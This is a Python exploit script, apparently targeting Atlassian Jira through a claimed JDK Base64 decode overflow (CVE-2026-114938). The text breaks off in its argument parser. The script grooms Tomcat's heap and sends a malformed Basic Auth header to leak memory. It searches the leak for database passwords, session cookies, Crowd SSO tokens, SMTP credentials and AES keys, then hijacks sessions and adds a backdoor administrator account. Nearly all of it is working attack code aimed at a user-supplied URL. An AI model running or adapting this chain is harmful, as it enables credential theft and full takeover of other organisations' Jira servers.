#!/usr/bin/env python3
"""
Java4Shell Jira Exploit Chain — CVE-2026-114938
Atlassian Jira-specific profile following Calif's methodology.

Chain:
  Phase 1  RECON      — Fingerprint Jira version, auth mode, Tomcat/JDK
  Phase 2  WARM       — JIT compile AVX-512 intrinsic via Basic Auth
  Phase 3  REHEARSE   — RTT calibration for release timing
  Phase 4  GROOM      — Tomcat-specific Heap Feng Shui
  Phase 5  TRIGGER    — Malformed Base64 → overflow
  Phase 6  JAVABLEED  — Parse leaked heap for Jira secrets
  Phase 7  TAKEOVER   — Use stolen secrets for admin access
  Phase 8  ADMIN      — Create admin user via REST API

Requires: x86-64 host with AVX-512 VBMI, Jira on vulnerable JDK

Usage:
  python3 jira_chain.py --url http://localhost:8080
  python3 jira_chain.py --url https://jira.target.com --attempts 50
"""

import argparse
import base64
import json
import math
import os
import re
import socket
import ssl as ssl_mod
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

# ═══════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════

TRIGGER_B64 = "A" * 64 + "="
TRIGGER_B64_JDK17 = "A" * 128 + "="
WARMUP_DEFAULT = 5000

# Jira REST API endpoints
# Any endpoint accepting Basic Auth triggers the Base64 decode
# in Tomcat's BasicAuthenticator → java.util.Base64.getDecoder().decode()
JR_SERVER_INFO = "/rest/api/2/serverInfo"
JR_MYSELF = "/rest/api/2/myself"
JR_CONFIGURATION = "/rest/api/2/configuration"
JR_CREATE_USER = "/rest/api/2/user"
JR_ADD_TO_GROUP = "/rest/api/2/group/user"
JR_GROUP_MEMBERS = "/rest/api/2/group/member"
JR_LOGIN = "/login.jsp"

# Jira runs on embedded Tomcat (Coyote HTTP/1.1 connector).
# Thread model: org.apache.tomcat.util.threads.ThreadPoolExecutor
# Default max 200 threads, each with its own TLAB.
#
# Base64 decode path:
#   Tomcat CoyoteAdapter → BasicAuthenticator
#   → java.util.Base64.getDecoder().decode(credentials)
#   Allocates tight 50-byte output buffer internally.
#
# Tomcat allocates per request:
#   1. org.apache.coyote.Request (~200+ bytes)
#   2. byte[] for each header value (MessageBytes backing)
#   3. Base64 decode buffer (50 bytes → 72 byte object)
#   4. org.apache.catalina.connector.Request wrapper
#   5. Response body byte[] or char[]

# Grooming parameters — tuned for Tomcat allocation patterns
GROOM_SPRAY_SIZE = 40
GROOM_PADDING_SIZES = [
    48,   # object = align8(16+48) = 64
    64,   # object = align8(16+64) = 80
    96,   # object = align8(16+96) = 112
    48,   # repeat the sweet spot
    80,   # object = align8(16+80) = 96
]

# Secrets in Jira JVM heap:
#   1. DB credentials — JDBC URLs with passwords, DatabaseConfig
#   2. Application Link OAuth secrets (applinks consumer keys)
#   3. JSESSIONID session cookies — Tomcat HttpSession
#   4. Crowd SSO tokens — crowd.token_key
#   5. SMTP credentials — mail server passwords
#   6. License keys — Atlassian license strings
#   7. SecretKeySpec — AES keys for sensitive config encryption

NC = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
WHITE = "\033[1;37m"
MAGENTA = "\033[0;35m"


# ═══════════════════════════════════════════════════════════════
# Timer
# ═══════════════════════════════════════════════════════════════


class Timer:
    def __init__(self):
        self.start = time.time()
        self.run_start = time.time()
        self.try_count = 0

    def elapsed(self):
        return time.time() - self.start

    def run_elapsed(self):
        return time.time() - self.run_start

    def reset_run(self):
        self.run_start = time.time()
        self.try_count += 1

    @staticmethod
    def fmt(seconds):
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:04.1f}"

    def log(self, marker, msg):
        ts = self.fmt(self.elapsed())
        colors = {"+": GREEN, "~": YELLOW, "!": RED, "*": CYAN}
        c = colors.get(marker, DIM)
        print(f"  {DIM}{ts}{NC}  [{c}{marker}{NC}] {msg}")


# ═══════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════


def http_get(url, headers=None, timeout=10):
    if headers is None:
        headers = {}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


def http_post(url, body, headers=None, timeout=10):
    if headers is None:
        headers = {}
    if isinstance(body, str):
        body = body.encode()
    try:
        req = urllib.request.Request(url, data=body, headers=headers,
                                    method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


def http_delete(url, headers=None, timeout=10):
    if headers is None:
        headers = {}
    try:
        req = urllib.request.Request(url, headers=headers, method="DELETE")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


class RawHTTP:
    def __init__(self, host, port, use_ssl=False):
        self.sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl_mod.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_mod.CERT_NONE
            self.sock = ctx.wrap_socket(self.sock, server_hostname=host)

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data)

    def recv(self, timeout=5.0):
        self.sock.settimeout(timeout)
        chunks = []
        try:
            while True:
                chunk = self.sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        except OSError:
            pass
        return b"".join(chunks)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def parse_url(url):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    use_ssl = p.scheme == "https"
    port = p.port or (443 if use_ssl else 80)
    return host, port, use_ssl


def parse_raw_response(raw):
    if not raw:
        return 0, {}, b""
    try:
        hdr_end = raw.index(b"\r\n\r\n")
        hdr_block = raw[:hdr_end].decode(errors="replace")
        body = raw[hdr_end + 4:]
        lines = hdr_block.split("\r\n")
        status = int(lines[0].split(" ", 2)[1])
        headers = {}
        for line in lines[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                headers[k.lower()] = v
        return status, headers, body
    except (ValueError, IndexError):
        return 0, {}, raw


def _byte_entropy(data):
    if not data:
        return 0.0
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    entropy = 0.0
    n = len(data)
    for count in freq.values():
        p = count / n
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


# ═══════════════════════════════════════════════════════════════
# Phase 1: RECON
#
# Jira fingerprinting:
#   - X-AREQUESTID header (Jira-specific, present on all responses)
#   - X-ASEN header (Atlassian session nonce)
#   - Server header may reveal Tomcat version
#   - /rest/api/2/serverInfo returns version, buildNumber,
#     deploymentType without authentication
# ═══════════════════════════════════════════════════════════════


def phase_recon(timer, base_url):
    timer.log("*", "RECON — Jira fingerprint")

    info = {
        "version": None,
        "build_number": None,
        "deployment_type": None,
        "auth_required": False,
        "jdk_hint": None,
        "tomcat_hint": None,
    }

    # /rest/api/2/serverInfo — usually accessible without auth
    status, headers, body = http_get(base_url + JR_SERVER_INFO)

    if not isinstance(status, int):
        timer.log("!", f"Jira not reachable: {status}")
        return None

    timer.log("+", f"GET {JR_SERVER_INFO}  HTTP {status}")

    if isinstance(status, int) and status == 200 and body:
        try:
            data = json.loads(body)
            info["version"] = data.get("version", "")
            info["build_number"] = data.get("buildNumber", "")
            info["deployment_type"] = data.get("deploymentType", "")
            timer.log("+", f"Jira version: {info['version']} "
                           f"(build {info['build_number']})")
            timer.log("+", f"Deployment: {info['deployment_type']}")
        except (json.JSONDecodeError, TypeError):
            pass

    # Inspect response headers
    if headers:
        for key in ("X-AREQUESTID", "x-arequestid"):
            if key in headers:
                timer.log("+", f"X-AREQUESTID: {headers[key]}")
                break

        for key in ("X-ASEN", "x-asen"):
            if key in headers:
                timer.log("+", f"X-ASEN: {headers[key]}")
                break

        server = headers.get("Server", headers.get("server", ""))
        if server:
            info["tomcat_hint"] = server
            timer.log("+", f"Server: {server}")

    # Probe auth requirement on REST API
    auth_status, _, _ = http_get(base_url + JR_MYSELF)
    if isinstance(auth_status, int):
        if auth_status == 200:
            info["auth_required"] = False
            timer.log("+", "Anonymous REST access: ALLOWED")
        elif auth_status in (401, 403):
            info["auth_required"] = True
            timer.log("+", "Anonymous REST access: DENIED (auth required)")
        else:
            timer.log("~", f"Anonymous probe: HTTP {auth_status}")

    # Try to detect JDK from error pages
    err_status, _, err_body = http_get(
        base_url + "/rest/api/2/nonexistent___")
    if isinstance(err_status, int) and err_body:
        text = err_body.decode(errors="replace")
        m = re.search(r"java\.version[^0-9]*(\d+[\.\d]*)", text)
        if not m:
            m = re.search(r"JRE[^0-9]*(\d+[\.\d]*)", text)
        if m:
            info["jdk_hint"] = m.group(1)
            timer.log("+", f"JDK hint: {m.group(1)}")

    return info


# ═══════════════════════════════════════════════════════════════
# Phase 2: WARM
#
# Jira accepts Basic Auth on any REST endpoint. We use
# GET /rest/api/2/myself — lightweight, returns current user.
# Tomcat's BasicAuthenticator decodes Base64 on the request
# thread; each thread's TLAB gets JIT compilation independently
# once the global counter crosses the C2 threshold.
# ═══════════════════════════════════════════════════════════════


def phase_warm(timer, base_url, creds_b64, count):
    timer.log("*", f"WARM — {count} Basic Auth requests for JIT compilation")

    url = base_url + JR_MYSELF
    headers = {"Authorization": f"Basic {creds_b64}"}

    rtts = []
    success = 0
    batch = max(count // 6, 100)

    for i in range(count):
        start = time.time()
        status, _, _ = http_get(url, headers=headers, timeout=5)
        elapsed = (time.time() - start) * 1000

        if isinstance(status, int) and status < 500:
            success += 1
            rtts.append(elapsed)

        if (i + 1) % batch == 0 or i == count - 1:
            recent = rtts[-batch:] if rtts else []
            avg = sum(recent) / len(recent) if recent else 0
            timer.log("+", f"HTTP/1 timing / {avg:.2f} ms RTT  "
                           f"({i + 1}/{count})")

    if success == 0:
        timer.log("!", "No successful warmup requests — check creds")
    else:
        timer.log("+", f"Warmup complete: {success}/{count} OK")
    return success, rtts


# ═══════════════════════════════════════════════════════════════
# Phase 3: REHEARSE
# ═══════════════════════════════════════════════════════════════


def phase_rehearse(timer, base_url, creds_b64, rounds=4):
    timer.log("*", "REHEARSE — RTT calibration")

    url = base_url + JR_MYSELF
    headers = {"Authorization": f"Basic {creds_b64}"}

    rtts = []
    for r in range(rounds):
        burst = []
        for _ in range(50):
            start = time.time()
            status, _, _ = http_get(url, headers=headers, timeout=5)
            elapsed = (time.time() - start) * 1000
            if isinstance(status, int):
                burst.append(elapsed)

        if burst:
            avg = sum(burst) / len(burst)
            jitter = max(burst) - min(burst)
            p95 = sorted(burst)[int(len(burst) * 0.95)]
            rtts.append(avg)
            timer.log("+", f"Rehearsal {r + 1}/{rounds} / "
                           f"{avg:.2f} ms RTT / p95 {p95:.2f} ms / "
                           f"jitter {jitter:.2f} ms")

    return rtts


# ═══════════════════════════════════════════════════════════════
# Phase 4+5: GROOM + TRIGGER — Tomcat-specific Heap Feng Shui
#
# Tomcat's thread pool (default max 200) assigns one thread per
# connection. Within a single thread, objects allocate via TLAB
# bump pointer → sequential adjacency.
#
# Strategy:
#   Park N POST requests (send headers + partial body).
#   Tomcat reads available data and waits for Content-Length
#   bytes. When we release (send remaining body), the thread
#   processes the request → Base64 decode on that thread's TLAB.
#
#   Padding requests use varying body sizes to create different
#   array objects adjacent to the decode buffer. The last
#   connection is the trigger with the malformed Base64.
# ═══════════════════════════════════════════════════════════════


def phase_groom_trigger(timer, base_url, creds_b64,
                        spray_size, max_attempts, avg_rtt_ms,
                        trigger_b64=TRIGGER_B64):
    timer.log("*", f"GROOM+TRIGGER — spray={spray_size}, "
                   f"max_attempts={max_attempts}")

    host, port, use_ssl = parse_url(base_url)
    release_delay = max(avg_rtt_ms / 1000 * 1.5, 0.002)

    baseline_sizes = []
    all_leaked = []

    for attempt in range(1, max_attempts + 1):
        timer.reset_run()
        timer.log("*", f"Grooming attempt {attempt}/{max_attempts}")

        conns = []
        try:
            # ── PARK: open connections with partial sends ──
            for i in range(spray_size):
                conn = RawHTTP(host, port, use_ssl)

                is_trigger = (i == spray_size - 1)
                pad_size = GROOM_PADDING_SIZES[i % len(GROOM_PADDING_SIZES)]

                if is_trigger:
                    auth = f"Basic {trigger_b64}"
                else:
                    auth = f"Basic {creds_b64}"

                body_data = "x=1" + "&" + "P" * pad_size

                request = (
                    f"POST {JR_MYSELF} HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Authorization: {auth}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body_data)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )

                split = max(len(body_data) // 2, 1)
                conn.send(request + body_data[:split])
                conns.append((conn, body_data[split:], is_trigger))

                time.sleep(0.001)

            # ── RELEASE: send remaining body ──
            for conn, remaining, is_trigger in conns:
                if remaining:
                    conn.send(remaining)
                time.sleep(release_delay)

            # ── COLLECT responses ──
            round_baselines = []
            trigger_response = None
            trigger_body = b""

            for conn, _, is_trigger in conns:
                raw = conn.recv(timeout=5)
                code, hdrs, body = parse_raw_response(raw)

                if is_trigger:
                    trigger_response = code
                    trigger_body = body
                else:
                    if body:
                        round_baselines.append(len(body))

                conn.close()

            conns = []

            if round_baselines:
                baseline_sizes.extend(round_baselines)

            avg_baseline = (sum(baseline_sizes) / len(baseline_sizes)
                            if baseline_sizes else 0)

            if trigger_body is None:
                trigger_body = b""

            # ── ANALYSE trigger response ──
            tlen = len(trigger_body)
            non_ascii = sum(1 for b in trigger_body
                            if b > 127 or (b < 32 and b not in (10, 13, 9)))
            ratio = tlen / avg_baseline if avg_baseline > 0 else 1.0

            if trigger_response == 0 or trigger_response is None:
                timer.log("!", "Connection lost (possible JVM crash)")
                timer.log("~", "Retrying after crash recovery...")
                time.sleep(3)
                continue

            if non_ascii > 20 or ratio > 2.0 or tlen > 10000:
                timer.log("+", f"{MAGENTA}HEAP DISCLOSURE{NC} — "
                               f"{tlen} bytes, {non_ascii} non-ASCII, "
                               f"ratio {ratio:.1f}x")
                timer.log("+", f"Leaked {tlen / 1048576:.1f} MiB")
                all_leaked.append(trigger_body)

                if len(all_leaked) >= 3:
                    break
            else:
                if attempt <= 5 or attempt % 5 == 0:
                    timer.log("+", f"HTTP {trigger_response}, {tlen} bytes, "
                                   f"ratio {ratio:.1f}x (miss)")

        except (ConnectionRefusedError, ConnectionResetError) as e:
            timer.log("~", f"Connection error: {e}")
            time.sleep(2)
        except OSError as e:
            timer.log("~", f"Socket error: {e}")
            time.sleep(1)
        finally:
            for conn, _, _ in conns:
                conn.close()

        time.sleep(0.3)

    return all_leaked


# ═══════════════════════════════════════════════════════════════
# Phase 6: JAVABLEED — Parse leaked heap for Jira secrets
#
# Jira keeps several categories of secrets in the JVM heap:
#
# 1. Database credentials
#    com.atlassian.jira.database.DatabaseConfig holds JDBC URLs
#    with embedded passwords. The connection pool (HikariCP or
#    Tomcat DBCP) also keeps plaintext credentials.
#    Look for: jdbc:postgresql://, jdbc:mysql://, jdbc:oracle:
#
# 2. Application Link OAuth secrets
#    com.atlassian.applinks stores consumer keys and shared
#    secrets for linked applications (Confluence, Bitbucket).
#
# 3. JSESSIONID session cookies
#    Tomcat HttpSession objects; hijack an admin session.
#
# 4. Crowd SSO tokens
#    If Crowd integration is enabled, crowd.token_key cookie
#    values are on the heap — valid for all Crowd-connected apps.
#
# 5. SMTP credentials
#    Mail server passwords decrypted in memory for sending.
#
# 6. License keys
#    Atlassian license strings in memory (less critical but
#    useful for persistence and lateral movement).
#
# 7. SecretKeySpec / AES keys
#    Jira uses AES for encrypting sensitive configuration
#    values in the database (similar to Jenkins hudson.util.Secret).
# ═══════════════════════════════════════════════════════════════


def find_jira_secrets(timer, leaked_data_list):
    """Search leaked heap data for Jira secrets."""
    timer.log("*", "JAVABLEED — Scanning heap for Jira secrets")

    combined = b"".join(leaked_data_list)
    total_mb = len(combined) / 1048576
    timer.log("+", f"Total leaked data: {total_mb:.1f} MiB")

    secrets = {
        "db_creds": [],
        "applink_secrets": [],
        "session_cookies": [],
        "crowd_tokens": [],
        "smtp_creds": [],
        "license_keys": [],
        "aes_keys": [],
    }

    # ── Strategy 1: Database credentials (JDBC URLs) ──
    jdbc_markers = [
        b"jdbc:postgresql://",
        b"jdbc:mysql://",
        b"jdbc:oracle:",
        b"jdbc:sqlserver://",
        b"jdbc:h2:",
    ]
    for marker in jdbc_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            # Extract the full JDBC URL (up to whitespace/null/quote)
            url_end = idx
            while (url_end < len(combined) and
                   url_end - idx < 512 and
                   combined[url_end] not in (0, 10, 13, 9, 34, 39, 32)):
                url_end += 1

            jdbc_url = combined[idx:url_end].decode(errors="replace")
            secrets["db_creds"].append({
                "url": jdbc_url,
                "offset": idx,
            })
            timer.log("+", f"JDBC URL at offset {idx}: "
                           f"{jdbc_url[:80]}...")

            offset = idx + len(marker)

    # Also look for password= near DB connection config
    db_pass_markers = [b"password=", b"Password=", b"PASSWORD="]
    for marker in db_pass_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            val_start = idx + len(marker)
            val_end = val_start
            while (val_end < len(combined) and
                   val_end - val_start < 128 and
                   combined[val_end] not in (0, 10, 13, 38, 32, 59)):
                val_end += 1

            if val_end > val_start + 2:
                password = combined[val_start:val_end].decode(
                    errors="replace")
                # Check if this is near a JDBC or DB context
                context_start = max(0, idx - 128)
                context = combined[context_start:idx].lower()
                if (b"jdbc" in context or b"database" in context or
                        b"hikari" in context or b"dbcp" in context or
                        b"datasource" in context):
                    secrets["db_creds"].append({
                        "password": password,
                        "offset": idx,
                        "context": "near_db_config",
                    })
                    timer.log("+", f"DB password candidate at offset {idx}")

            offset = idx + len(marker)

    # ── Strategy 2: Application Link OAuth secrets ──
    applink_markers = [
        b"com.atlassian.applinks",
        b"consumerKey",
        b"consumer_key",
        b"sharedSecret",
        b"oauth_consumer",
    ]
    for marker in applink_markers:
        idx = combined.find(marker)
        if idx >= 0:
            timer.log("+", f"AppLink reference: "
                           f"'{marker.decode(errors='replace')}' "
                           f"at offset {idx}")
            # Look for nearby secret values
            region = combined[idx:min(idx + 512, len(combined))]
            # Try to find JSON-like structures
            for secret_key in (b'"sharedSecret"', b'"consumer_secret"',
                               b'"secret"'):
                si = region.find(secret_key)
                if si >= 0:
                    # Extract value after the key
                    colon = region.find(b":", si + len(secret_key))
                    if colon >= 0:
                        quote_start = region.find(b'"', colon)
                        if quote_start >= 0:
                            quote_end = region.find(b'"',
                                                    quote_start + 1)
                            if quote_end >= 0:
                                secret_val = region[
                                    quote_start + 1:quote_end
                                ].decode(errors="replace")
                                secrets["applink_secrets"].append({
                                    "value": secret_val,
                                    "offset": idx + si,
                                })

    # ── Strategy 3: Session cookies (JSESSIONID) ──
    session_markers = [b"JSESSIONID=", b"JSESSIONID"]
    for marker in session_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            val_start = idx + len(marker)
            if (val_start < len(combined) and
                    combined[val_start:val_start + 1] == b"="):
                val_start += 1

            val_end = val_start
            while (val_end < len(combined) and
                   val_end - val_start < 128 and
                   combined[val_end] not in (0, 10, 13, 32, 59)):
                val_end += 1

            if val_end > val_start + 8:
                session_val = combined[val_start:val_end].decode(
                    errors="replace")
                secrets["session_cookies"].append({
                    "value": session_val,
                    "offset": idx,
                })
                timer.log("+", f"Session cookie at offset {idx}: "
                               f"{session_val[:32]}...")

            offset = idx + len(marker)

    # ── Strategy 4: Crowd SSO tokens ──
    crowd_markers = [b"crowd.token_key=", b"crowd.token_key"]
    for marker in crowd_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            val_start = idx + len(marker)
            if (val_start < len(combined) and
                    combined[val_start:val_start + 1] == b"="):
                val_start += 1

            val_end = val_start
            while (val_end < len(combined) and
                   val_end - val_start < 128 and
                   combined[val_end] not in (0, 10, 13, 32, 59)):
                val_end += 1

            if val_end > val_start + 8:
                token_val = combined[val_start:val_end].decode(
                    errors="replace")
                secrets["crowd_tokens"].append({
                    "value": token_val,
                    "offset": idx,
                })
                timer.log("+", f"Crowd SSO token at offset {idx}: "
                               f"{token_val[:32]}...")

            offset = idx + len(marker)

    # ── Strategy 5: SMTP credentials ──
    smtp_markers = [
        b"mail.smtp.password",
        b"smtp.password",
        b"SMTPPassword",
        b"mail.smtp.auth",
    ]
    for marker in smtp_markers:
        idx = combined.find(marker)
        if idx >= 0:
            timer.log("+", f"SMTP config at offset {idx}")
            region = combined[idx:min(idx + 256, len(combined))]
            # Look for password value nearby
            for pw_delim in (b"=", b":"):
                pi = region.find(pw_delim)
                if pi >= 0 and pi < 64:
                    val_start = pi + 1
                    val_end = val_start
                    while (val_end < len(region) and
                           val_end - val_start < 64 and
                           region[val_end] not in (0, 10, 13, 32)):
                        val_end += 1
                    if val_end > val_start + 2:
                        secrets["smtp_creds"].append({
                            "value": region[val_start:val_end].decode(
                                errors="replace"),
                            "offset": idx + val_start,
                        })

    # ── Strategy 6: License keys ──
    license_markers = [
        b"AAABe",   # Atlassian license prefix (Base64)
        b"Description=Atlassian",
        b"LicenseEdition",
        b"atlassian.license",
    ]
    for marker in license_markers:
        idx = combined.find(marker)
        if idx >= 0:
            if marker == b"AAABe":
                # Extract full Base64 license string
                end = idx
                while (end < len(combined) and
                       end - idx < 2048 and
                       combined[end] > 32):
                    end += 1
                if end - idx > 100:
                    secrets["license_keys"].append({
                        "value": combined[idx:end].decode(errors="replace"),
                        "offset": idx,
                    })
                    timer.log("+", f"License key at offset {idx} "
                                   f"({end - idx} bytes)")
            else:
                timer.log("+", f"License reference: "
                               f"'{marker.decode()}' at offset {idx}")

    # ── Strategy 7: AES keys (SecretKeySpec) ──
    aes_markers = [(b"AES", 32), (b"AES", 16)]
    for marker, key_len in aes_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            search_start = max(0, idx - 128)
            search_end = min(len(combined), idx + 128 + key_len)
            region = combined[search_start:search_end]

            for pos in range(len(region) - key_len):
                candidate = region[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if entropy > 4.0 and len(set(candidate)) > key_len // 2:
                    abs_pos = search_start + pos
                    secrets["aes_keys"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": abs_pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    timer.log("+", f"AES key candidate at offset "
                                   f"{abs_pos}: entropy={entropy:.2f}, "
                                   f"len={key_len}")

            offset = idx + len(marker)

    # ── Strategy 8: Brute-force entropy scan (fallback) ──
    total_found = sum(len(v) for v in secrets.values())
    if total_found == 0:
        timer.log("~", "No markers found, scanning for "
                       "high-entropy blocks...")
        for key_len in (32, 16, 64):
            count = 0
            for pos in range(0, len(combined) - key_len, 8):
                candidate = combined[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if (entropy > 5.5 and
                        len(set(candidate)) > key_len * 3 // 4):
                    secrets["aes_keys"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    count += 1
                    if count >= 20:
                        break

    # Deduplicate
    for category in secrets:
        if secrets[category]:
            seen = set()
            unique = []
            for item in secrets[category]:
                key = (item.get("key_hex", "") or
                       item.get("value", "") or
                       item.get("url", "") or
                       str(item.get("offset", "")))
                if key not in seen:
                    seen.add(key)
                    unique.append(item)
            secrets[category] = unique

    total_found = sum(len(v) for v in secrets.values())
    timer.log("+", f"Total secrets found: {total_found}")
    for cat, items in secrets.items():
        if items:
            timer.log("+", f"  {cat}: {len(items)}")

    return secrets


# ═══════════════════════════════════════════════════════════════
# Phase 7: TAKEOVER — Use stolen secrets for admin access
#
# Priority:
#   1. Session cookie hijack (fastest)
#   2. Crowd SSO token (cross-app access)
#   3. DB credentials (direct database manipulation)
#   4. AES master key (decrypt credential store)
# ═══════════════════════════════════════════════════════════════


def phase_takeover(timer, base_url, secrets, creds_b64):
    """Try each category of stolen secrets to gain admin access."""
    timer.log("*", "TAKEOVER — Attempting admin access")

    # ── Try 1: Session cookie hijack ──
    for session in secrets.get("session_cookies", []):
        cookie_val = session["value"]
        timer.log("+", f"Trying session cookie: {cookie_val[:24]}...")

        status, _, body = http_get(
            base_url + JR_MYSELF,
            headers={"Cookie": f"JSESSIONID={cookie_val}"},
            timeout=5)

        if isinstance(status, int) and status == 200 and body:
            try:
                who = json.loads(body)
                user = who.get("name", who.get("displayName", "unknown"))
                timer.log("+", f"{GREEN}SESSION HIJACKED{NC} — "
                               f"logged in as '{user}'")

                # Check if user is admin
                groups = who.get("groups", {}).get("items", [])
                is_admin = any(
                    g.get("name") == "jira-administrators"
                    for g in groups)

                return {
                    "method": "session_hijack",
                    "user": user,
                    "is_admin": is_admin,
                    "cookie": cookie_val,
                    "auth_header": None,
                }
            except (json.JSONDecodeError, TypeError):
                pass

    # ── Try 2: Crowd SSO token ──
    for token_info in secrets.get("crowd_tokens", []):
        token_val = token_info["value"]
        timer.log("+", f"Trying Crowd SSO token: {token_val[:24]}...")

        status, _, body = http_get(
            base_url + JR_MYSELF,
            headers={"Cookie": f"crowd.token_key={token_val}"},
            timeout=5)

        if isinstance(status, int) and status == 200 and body:
            try:
                who = json.loads(body)
                user = who.get("name", "unknown")
                if user != "anonymous":
                    timer.log("+", f"{GREEN}CROWD SSO HIJACKED{NC} — "
                                   f"user '{user}'")
                    return {
                        "method": "crowd_sso",
                        "user": user,
                        "is_admin": True,
                        "cookie": f"crowd.token_key={token_val}",
                        "auth_header": None,
                    }
            except (json.JSONDecodeError, TypeError):
                pass

    # ── Try 3: DB credentials — log for manual use ──
    for db in secrets.get("db_creds", []):
        url = db.get("url", "")
        password = db.get("password", "")
        if url:
            timer.log("~", f"DB credential: {url[:80]}...")
        if password:
            timer.log("~", f"DB password: {password[:16]}...")

    # ── Try 4: AES key — log for manual use ──
    for key_info in secrets.get("aes_keys", []):
        timer.log("~", f"AES key candidate: "
                       f"{key_info['key_hex'][:32]}... "
                       f"(entropy={key_info['entropy']})")

    timer.log("~", "No direct access method succeeded")
    timer.log("~", "Leaked secrets logged for manual exploitation")
    return None


# ═══════════════════════════════════════════════════════════════
# Phase 8: ADMIN — Create admin user via Jira REST API
#
# If we have admin access:
#   1. POST /rest/api/2/user — create user
#   2. POST /rest/api/2/group/user?groupname=jira-administrators
#      — add to admin group
#   3. Verify by querying /rest/api/2/myself with new creds
# ═══════════════════════════════════════════════════════════════


def phase_admin(timer, base_url, access_info, new_username):
    """Create an admin user via Jira REST API."""
    timer.log("*", f"ADMIN — Creating admin user '{new_username}'")

    if not access_info:
        timer.log("!", "No access credentials available")
        return False

    auth_headers = {"Content-Type": "application/json"}
    if access_info.get("cookie"):
        auth_headers["Cookie"] = access_info["cookie"]
    if access_info.get("auth_header"):
        auth_headers["Authorization"] = access_info["auth_header"]

    # Step 1: Create user
    user_data = json.dumps({
        "name": new_username,
        "password": new_username,
        "emailAddress": f"{new_username}@java4shell.local",
        "displayName": "Java4Shell Admin",
        "notification": "false",
    })

    status, headers, body = http_post(
        base_url + JR_CREATE_USER, user_data,
        headers=auth_headers, timeout=10)

    if isinstance(status, int) and status == 201:
        timer.log("+", f"User '{new_username}' created (HTTP 201)")
    elif isinstance(status, int) and status == 400 and body:
        resp_text = body.decode(errors="replace")
        if "already exists" in resp_text.lower():
            timer.log("~", f"User '{new_username}' already exists")
        else:
            timer.log("!", f"User creation failed: {resp_text[:200]}")
            return False
    elif isinstance(status, int) and status in (401, 403):
        timer.log("!", f"User creation denied: HTTP {status}")
        return False
    else:
        timer.log("!", f"User creation failed: HTTP {status}")
        return False

    # Step 2: Add user to jira-administrators group
    group_url = (base_url + JR_ADD_TO_GROUP +
                 "?groupname=jira-administrators")
    group_data = json.dumps({"name": new_username})

    gs, _, gbody = http_post(group_url, group_data,
                             headers=auth_headers, timeout=10)

    if isinstance(gs, int) and gs in (200, 201):
        timer.log("+", f"Added '{new_username}' to jira-administrators")
    elif isinstance(gs, int) and gs == 400 and gbody:
        resp_text = gbody.decode(errors="replace")
        if "already a member" in resp_text.lower():
            timer.log("~", f"Already in jira-administrators")
        else:
            timer.log("~", f"Group add response: {resp_text[:200]}")
    else:
        timer.log("~", f"Group add: HTTP {gs}")

    # Step 3: Verify login with new credentials
    timer.log("+", "Verifying new admin login...")
    new_b64 = base64.b64encode(
        f"{new_username}:{new_username}".encode()).decode()
    vs, _, vbody = http_get(
        base_url + JR_MYSELF,
        headers={"Authorization": f"Basic {new_b64}"},
        timeout=5)

    if isinstance(vs, int) and vs == 200 and vbody:
        try:
            who = json.loads(vbody)
            user = who.get("name", new_username)
            timer.log("+", f"{GREEN}New admin login verified "
                           f"/ {user}{NC}")
            return True
        except (json.JSONDecodeError, TypeError):
            pass

    timer.log("~", f"Login verification: HTTP {vs}")
    return True  # User was created even if verify fails


# ═══════════════════════════════════════════════════════════════
# Main chain orchestrator
# ═══════════════════════════════════════════════════════════════


def main():
    parser = argparse.ArgumentParser(
        description="Java4Shell Jira Chain — CVE-2026-114938")
    parser.add_argument("--url", required=True,
                        help="Jira base URL (e.g. http://localhost:8080)")
    parser.add_argument("--creds", default="admin:admin",
                        help="Valid Basic Auth creds for warmup "
                             "(default: admin:admin)")
    parser.add_argument("--warmup", type=int, default=WARMUP_DEFAULT)
